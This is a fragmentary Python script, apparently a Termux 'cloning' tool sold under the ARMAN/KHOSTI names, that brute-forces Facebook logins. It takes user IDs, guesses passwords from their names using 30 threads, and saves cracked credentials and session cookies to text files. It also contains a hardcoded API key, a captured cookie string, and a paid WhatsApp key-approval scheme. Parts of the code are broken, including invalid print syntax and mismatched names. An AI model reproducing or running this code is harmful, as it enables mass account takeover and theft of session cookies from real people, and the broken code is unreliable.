...
os.system('clear')
print('         \x1b[38;5;46m WELCOME TO HA WORLD          ')
...
__________________________________________________
 ...
 \033[1;96m   ▁ ▂ ▃ ▅ ▆ ▇ █ \033[1;36mHA ARMAN\033[1;96m █ ▇ ▆ ▅ ▃ ▂ ▁                                                         
──────────────────────────────────────────────────
\033[1;92m Owner   :            KHOSTI
\033[1;92m Facebook:            Termux Command 
\033[1;92m Whatsapp:            +93783361438
\033[1;92m Github  :            ARMANHA
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        input("Press enter to back ARMANMenu ")
        exit()
os.system("xd-open https://wa.me/+93783361438")
def menu():   
    os.system('clear')
    print(logo)
  ...
  ###  elif select =='2':
       ...
       os.system('xdg-open https://wa.me/+93783361438');menu()
    else:
        print('\n Select Wrong option ... ')
        time.sleep(2)
        NIX(allkey)
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f'\r\r\33[1;92m [\33[1;92mHA-XD-M1\33[1;92m] %s | \033[1;92mOK:-%s  \033[1;92m'%(loop,len(oks)));sys.stdout.flush()
            sys.stdout.flush()
...
"api_key": "882a8490361da98702bf97a021ddc14d"}
    ...
    # 'cookie': 'datr=tDbOZeqsQQtVYsLZxTXQl2OQ; sb=tzbOZZ8QJasGAuwibHNKoesq; ps_l=0; ps_n=0; locale=en_US; dpr=3.7835533618927; vpd=v1%3B589x314x3.43505597114563; wl_cbv=v2%3Bclient_version%3A2412%3Btimestamp%3A1708431439; wd=315x589; fr=0T4pP1Fal8KPFX0to.AWWZyUahrOII14PKVhfQdPCHlAQ.Bl0f9T.Y3.AAA.0.0.Bl1Jia.AWVGynN1Dx0',
    'dpr': '2.75',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"M2101K6G"',
    ...
    'viewport-width': '980',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);HAb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={NIXb};{ckkk}"
                    print(f"\r{R} \x1b[38;5;196m[\033[38;5;46mHA-💚\x1b[38;5;196m] \x1b[38;5;46m{sid} \x1b[1;92m●\x1b[38;5;46m {ps} {S}\n=#={ckkk}")
                    ...
                    break
                     ...
                     #print(f"\r\x1b[1;96m [KHOSTI-CP] {sid} ● {ps} {S}")
                     cps.append(sid)
...
"api_key": "882a8490361da98702bf97a021ddc14d"}
    ...
    'viewport-width': '980',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);HAb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={NIXb};{ckkk}"
                    print(f"\r{R} \x1b[38;5;196m[\033[38;5;46mKHOSTI-💚\x1b[38;5;196m] \x1b[38;5;46m{sid} \x1b[1;92m●\x1b[38;5;46m {ps} {S}\n=#={ckkk}")
    ...
    def pasw(self):       
            ...
            print("\x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            with KHOSTI(max_workers=30) as termuxworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                HAworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                HAworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                HAworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                HAworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)
...
def AFG_CLONING():
    ...
    linex()
    kode = input(' CHOSE SIM CODE : ==> 9378, 9377, 9379')
    linex()
    os.system('clear')
    print(logo)
...
def rcrack(uid,pwx,tl):
    ...
    'viewport-width': '980',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[KHOSTI-OK] '+cid+' | '+ps+'\033[0;97m')
                print('\n[‎‎💖]\033[0;33m COOKIE = \033[1;34m'+coki+  '  ''  \033[0;97m')
                linex()
                open('KHOSTI-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[KHOSTI-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('KHOSTI-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[1;92m[HA]\033[1;92m] %s|\33[1;31m[OK]:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass 
############            
...
def main_apv():
    ...
    print(f" Your Key : \x1b[1;31m"+1→0→2→6→4→u→0→_→h→2→6→4)
    print("\x1b[1;92m--------------------------------------------------")
    try:
        system = requests.get("https://github.com/Hazrtalmas/Arman/blob/main/afghan.txt").text 
        if Xyteee in system:
            print()
            msg = str(os.geteuid()) 
            time.sleep(1) 
            ...
            print('\033[1;92m[\033[1;92m•\033[1;92m]\033[1;92m Notes : ARMAN Tools Can buy in all countries!')
            print('\033[1;92m-----------------------------------------------------\033[1;97m')
            print('\033[1;92m [\033[1;92m1\033[1;92m]\033[1;92m 180AF \033[1;92mApproval For 1 month')
            print(' \033[1;92m[\033[1;92m2\033[1;92m]\033[1;92m 100AF \033[1;92mApproval For 15 days')
            print(' \033[1;92m[\033[1;92m3\033[1;92m]\033[1;92m 70AF \033[1;92mApproval For 7 days \033[1;37m')
            print('\033[1;92m-----------------------------------------------------')
            Picchi = input(' Select Buy Option : ')
            os.system("clear")
            print(logo)
            print(f" \033[1;92mYour Key :\033[31;1m{1→0→2→6→4→u→0→_→h→2→6→4}")
            ...
            print("-----------------------------------------------------")
            url_wa = "https://api.whatsapp.com/send?phone=+93783361438&text="
            choice = input(" Enter your choice  : ")
            tks = ("Hi ARMAN Sir, I Need To Buy Your ARMAN Tools Version 0.0.4 Premium Please Accept My Key To Premium\n\n Name : "+choice+"\n Key : "+Xyteee+"\n Buy Select : "+Picchi)
